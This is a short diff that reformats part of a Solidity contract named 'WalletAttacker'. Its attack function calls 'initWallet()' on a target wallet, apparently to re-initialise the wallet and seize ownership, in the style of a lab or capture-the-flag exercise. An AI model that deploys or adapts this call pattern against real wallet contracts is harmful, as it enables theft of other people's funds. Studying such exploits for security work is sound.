@@ -10,8 +10,10 @@ contract WalletAttacker {
     }
 
     function attack() public payable {
-        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("initWallet()")));
-        
+        bytes memory data = abi.encodeWithSelector(
+            bytes4(keccak256("initWallet()"))
+        );
+
         (bool success, ) = target.call(data);
         require(success, "Attack failed");
     }
